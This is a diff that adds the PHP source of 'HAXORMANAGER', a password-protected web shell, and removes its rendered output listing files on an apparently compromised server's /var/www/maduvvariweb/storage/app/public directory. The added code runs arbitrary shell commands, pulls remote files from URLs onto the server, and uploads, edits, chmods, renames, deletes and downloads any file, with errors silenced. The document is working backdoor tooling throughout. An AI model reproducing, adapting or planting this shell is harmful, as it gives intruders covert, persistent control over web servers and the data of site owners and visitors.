@@ -1,4 +1,53 @@
-<html><head><title>HAXORMANAGER</title><style>
+<?php
+header("X-XSS-Protection: 1; mode=block");
+header("X-Frame-Options: DENY");
+header("X-Content-Type-Options: nosniff");
+
+ob_start();
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', FALSE);
+
+session_start();
+
+// Hash password example (MD5 hashed password)
+$hashed_password = '6d93733f7eda6b444bd03710a3b42879';
+
+// Sanitize input function
+function sanitize_input($data) {
+    return htmlspecialchars(trim($data));
+}
+
+// Logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    session_regenerate_id(true);
+    header("Location: ?");
+    exit;
+}
+
+// Login handling
+if (!isset($_SESSION['logged_in'])) {
+    if (isset($_POST['password']) && md5($_POST['password']) == $hashed_password) {
+        $_SESSION['logged_in'] = true;
+    } else {
+        echo '<style>
+                body { background-color: #2c2f33; font-family: Arial, sans-serif; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
+                form { background-color: #23272a; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.5); text-align: center; }
+                input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 3px; }
+                input[type="submit"] { background-color: #7289da; border: none; padding: 10px 20px; color: white; border-radius: 3px; cursor: pointer; }
+              </style>
+              <form method="post">
+                <h2>Login</h2>
+                <input type="password" name="password" placeholder="Enter Password" required />
+                <input type="submit" value="Login" />
+              </form>';
+        exit;
+    }
+}
+
+echo '<html><head><title>HAXORMANAGER</title>';
+echo '<style>
     body { font-family: Arial, sans-serif; background-color: #2c2f33; color: #fff; margin: 0; padding: 0; }
     h1 { color: #7289da; text-align: center; }
     input[type="text"], input[type="password"], input[type="url"], input[type="submit"], input[type="file"] { padding: 10px; margin: 10px; width: 300px; border-radius: 5px; border: none; }
@@ -10,106 +59,196 @@
     a:hover { text-decoration: underline; }
     .container { width: 80%; margin: 0 auto; }
     textarea { font-size: 14px; width: 100%; height: 600px; background-color: #23272a; color: #eee; border: none; padding: 10px; }
-</style></head><body><div class="container"><h1>HAXORMANAGER</h1><p>This is a simple file manager tool created by HaxorNoname.</p><form method="post">
+</style></head><body>';
+
+echo '<div class="container">';
+echo '<h1>HAXORMANAGER</h1>';
+echo '<p>This is a simple file manager tool created by HaxorNoname.</p>';
+
+// Command execution form
+echo '<form method="post">
         <input type="text" name="cmd" placeholder="Enter command" required />
         <input type="submit" value="Execute" />
-      </form><form method="post">
+      </form>';
+
+if (isset($_POST['cmd'])) {
+    $command = sanitize_input($_POST['cmd']);
+    echo '<pre>' . htmlspecialchars(shell_exec($command)) . '</pre>';
+}
+
+// Remote upload form
+echo '<form method="post">
         <input type="url" name="remote_url" placeholder="Remote File URL" required />
         <input type="submit" value="Remote Upload" />
-      </form><form method="get">
+      </form>';
+
+if (isset($_POST['remote_url'])) {
+    $remote_url = filter_var($_POST['remote_url'], FILTER_SANITIZE_URL);
+    if (filter_var($remote_url, FILTER_VALIDATE_URL)) {
+        $file_name = basename($remote_url);
+        if (file_put_contents($file_name, fopen($remote_url, 'r'))) {
+            echo '<p><font color="green">Remote file uploaded successfully as ' . $file_name . '</font></p>';
+        } else {
+            echo '<p><font color="red">Remote upload failed.</font></p>';
+        }
+    } else {
+        echo '<p><font color="red">Invalid URL.</font></p>';
+    }
+}
+
+// File/Folder search form
+echo '<form method="get">
         <input type="text" name="search" placeholder="Search files or folders" />
         <input type="submit" value="Search" />
-      </form><a href="?HX=/">/</a><a href="?HX=/var">var</a>/<a href="?HX=/var/www">www</a>/<a href="?HX=/var/www/maduvvariweb">maduvvariweb</a>/<a href="?HX=/var/www/maduvvariweb/storage">storage</a>/<a href="?HX=/var/www/maduvvariweb/storage/app">app</a>/<a href="?HX=/var/www/maduvvariweb/storage/app/public">public</a>/<br><br><form method="post">
+      </form>';
+
+// Display current path
+$HX = isset($_GET['HX']) ? sanitize_input($_GET['HX']) : getcwd();
+$HX = str_replace('\\', '/', $HX);
+$paths = explode('/', $HX);
+
+foreach ($paths as $id => $pat) {
+    if ($pat == '' && $id == 0) {
+        echo '<a href="?HX=/">/</a>';
+        continue;
+    }
+    if ($pat == '') continue;
+    echo '<a href="?HX=';
+    for ($i = 0; $i <= $id; $i++) {
+        echo "$paths[$i]";
+        if ($i != $id) echo "/";
+    }
+    echo '">'.$pat.'</a>/';
+}
+
+// Create new file or directory form
+echo '<br><br><form method="post">
         <input type="text" name="new_name" placeholder="Enter file/folder name" required />
         <input type="submit" name="create_file" value="Create File" />
         <input type="submit" name="create_dir" value="Create Directory" />
-      </form><br><form enctype="multipart/form-data" method="POST">
+      </form>';
+
+if (isset($_POST['create_file'])) {
+    $new_file = $HX . '/' . sanitize_input($_POST['new_name']);
+    if (file_put_contents($new_file, '') !== false) {
+        echo '<p><font color="green">File created successfully.</font></p>';
+    } else {
+        echo '<p><font color="red">Failed to create file.</font></p>';
+    }
+}
+
+if (isset($_POST['create_dir'])) {
+    $new_dir = $HX . '/' . sanitize_input($_POST['new_name']);
+    if (mkdir($new_dir)) {
+        echo '<p><font color="green">Directory created successfully.</font></p>';
+    } else {
+        echo '<p><font color="red">Failed to create directory.</font></p>';
+    }
+}
+
+// File upload form
+echo '<br><form enctype="multipart/form-data" method="POST">
         <input type="file" name="file" required />
         <input type="submit" value="Upload" />
-      </form><table><tr>
-            <td>Directory</td>
-            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/.config">.config</a></td>
-            <td>-</td>
-            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/.config">Edit</a> | 
-                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/.config">Chmod</a> | 
-                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/.config">Rename</a> | 
-                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/.config" onclick="return confirm('Are you sure?')">Delete</a> |
-                <a href="?download=/var/www/maduvvariweb/storage/app/public/.config">Download</a>
+      </form>';
+
+if (isset($_FILES['file'])) {
+    $target_file = $HX . '/' . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
+        echo '<p><font color="green">File uploaded successfully.</font></p>';
+    } else {
+        echo '<p><font color="red">File upload failed.</font></p>';
+    }
+}
+
+// Display file structure
+echo '<table>';
+$scandir = scandir($HX);
+if (isset($_GET['search'])) {
+    $search_query = strtolower($_GET['search']);
+    $scandir = array_filter($scandir, function($file) use ($search_query) {
+        return strpos(strtolower($file), $search_query) !== false;
+    });
+}
+foreach ($scandir as $item) {
+    if ($item == '.' || $item == '..') continue;
+    $path = "$HX/$item";
+    $isDir = is_dir($path) ? 'Directory' : 'File';
+    $size = is_file($path) ? filesize($path) : '-';
+    echo "<tr>
+            <td>$isDir</td>
+            <td><a href=\"?HX=$path\">$item</a></td>
+            <td>$size</td>
+            <td><a href=\"?option=edit&HX=$path\">Edit</a> | 
+                <a href=\"?option=chmod&HX=$path\">Chmod</a> | 
+                <a href=\"?option=rename&HX=$path\">Rename</a> | 
+                <a href=\"?option=delete&HX=$path\" onclick=\"return confirm('Are you sure?')\">Delete</a> |
+                <a href=\"?download=$path\">Download</a>
             </td>
-          </tr><tr>
-            <td>File</td>
-            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/.gitignore">.gitignore</a></td>
-            <td>14</td>
-            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/.gitignore">Edit</a> | 
-                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/.gitignore">Chmod</a> | 
-                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/.gitignore">Rename</a> | 
-                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/.gitignore" onclick="return confirm('Are you sure?')">Delete</a> |
-                <a href="?download=/var/www/maduvvariweb/storage/app/public/.gitignore">Download</a>
-            </td>
-          </tr><tr>
-            <td>File</td>
-            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/.htaccess">.htaccess</a></td>
-            <td>0</td>
-            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/.htaccess">Edit</a> | 
-                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/.htaccess">Chmod</a> | 
-                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/.htaccess">Rename</a> | 
-                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/.htaccess" onclick="return confirm('Are you sure?')">Delete</a> |
-                <a href="?download=/var/www/maduvvariweb/storage/app/public/.htaccess">Download</a>
-            </td>
-          </tr><tr>
-            <td>File</td>
-            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png">01JDZ9FMMVWP45M5F8J2NY4P53.png</a></td>
-            <td>332882</td>
-            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png">Edit</a> | 
-                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png">Chmod</a> | 
-                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png">Rename</a> | 
-                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png" onclick="return confirm('Are you sure?')">Delete</a> |
-                <a href="?download=/var/www/maduvvariweb/storage/app/public/01JDZ9FMMVWP45M5F8J2NY4P53.png">Download</a>
-            </td>
-          </tr><tr>
-            <td>File</td>
-            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg">01JDZAE4FW520MYGE7QEAQ1D4V.jpg</a></td>
-            <td>35123</td>
-            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg">Edit</a> | 
-                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg">Chmod</a> | 
-                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg">Rename</a> | 
-                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg" onclick="return confirm('Are you sure?')">Delete</a> |
-                <a href="?download=/var/www/maduvvariweb/storage/app/public/01JDZAE4FW520MYGE7QEAQ1D4V.jpg">Download</a>
-            </td>
-          </tr><tr>
-            <td>File</td>
-            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png">01JDZB375PCQ64C4MCW8DZ38HF.png</a></td>
-            <td>201788</td>
-            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png">Edit</a> | 
-                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png">Chmod</a> | 
-                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png">Rename</a> | 
-                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png" onclick="return confirm('Are you sure?')">Delete</a> |
-                <a href="?download=/var/www/maduvvariweb/storage/app/public/01JDZB375PCQ64C4MCW8DZ38HF.png">Download</a>
-            </td>
-          </tr><tr>
-            <td>File</td>
-            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png">01JDZBCSCSXHRZ27SDTJ2EYG81.png</a></td>
-            <td>46778</td>
-            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png">Edit</a> | 
-                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png">Chmod</a> | 
-                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png">Rename</a> | 
-                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png" onclick="return confirm('Are you sure?')">Delete</a> |
-                <a href="?download=/var/www/maduvvariweb/storage/app/public/01JDZBCSCSXHRZ27SDTJ2EYG81.png">Download</a>
-            </td>
-          </tr><tr>
-            <td>File</td>
-            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png">01JDZBDTRY1FBRTM3WRHA62DYS.png</a></td>
-            <td>46778</td>
-            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png">Edit</a> | 
-                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png">Chmod</a> | 
-                <a href="?option=rename&HX=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png">Rename</a> | 
-                <a href="?option=delete&HX=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png" onclick="return confirm('Are you sure?')">Delete</a> |
-                <a href="?download=/var/www/maduvvariweb/storage/app/public/01JDZBDTRY1FBRTM3WRHA62DYS.png">Download</a>
-            </td>
-          </tr><tr>
-            <td>File</td>
-            <td><a href="?HX=/var/www/maduvvariweb/storage/app/public/01JDZBETPNCKP7SE4708R8QMBT.png">01JDZBETPNCKP7SE4708R8QMBT.png</a></td>
-            <td>46778</td>
-            <td><a href="?option=edit&HX=/var/www/maduvvariweb/storage/app/public/01JDZBETPNCKP7SE4708R8QMBT.png">Edit</a> | 
-                <a href="?option=chmod&HX=/var/www/maduvvariweb/storage/app/public/01JDZBETPNCKP7SE4708R8QMBT.png">Chmod</a> | 
-                
+          </tr>";
+}
+echo '</table>';
+
+// File download
+if (isset($_GET['download'])) {
+    $file = $_GET['download'];
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename='.basename($file));
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        flush();
+        readfile($file);
+        exit;
+    } else {
+        echo '<p><font color="red">File not found.</font></p>';
+    }
+}
+
+// File operations (edit, chmod, rename, delete)
+if (isset($_GET['option'])) {
+    $option = $_GET['option'];
+    $file = $_GET['HX'];
+
+    if ($option == 'edit') {
+        if (isset($_POST['new_content'])) {
+            file_put_contents($file, $_POST['new_content']);
+            echo '<p><font color="green">File edited successfully.</font></p>';
+        }
+        echo '<form method="post">
+                <textarea name="new_content">'.htmlspecialchars(file_get_contents($file)).'</textarea>
+                <input type="submit" value="Save Changes" />
+              </form>';
+    } elseif ($option == 'chmod') {
+        if (isset($_POST['new_perms'])) {
+            chmod($file, octdec($_POST['new_perms']));
+            echo '<p><font color="green">Permissions changed successfully.</font></p>';
+        }
+        echo '<form method="post">
+                <input type="text" name="new_perms" placeholder="Enter new permissions (e.g., 0755)" required />
+                <input type="submit" value="Change Permissions" />
+              </form>';
+    } elseif ($option == 'rename') {
+        if (isset($_POST['new_name'])) {
+            rename($file, dirname($file) . '/' . $_POST['new_name']);
+            echo '<p><font color="green">File renamed successfully.</font></p>';
+        }
+        echo '<form method="post">
+                <input type="text" name="new_name" placeholder="Enter new name" required />
+                <input type="submit" value="Rename" />
+              </form>';
+    } elseif ($option == 'delete') {
+        if (is_dir($file)) {
+            rmdir($file);
+        } else {
+            unlink($file);
+        }
+        echo '<p><font color="red">File deleted successfully.</font></p>';
+    }
+}
+
+echo '</div></body></html>';
+?>                
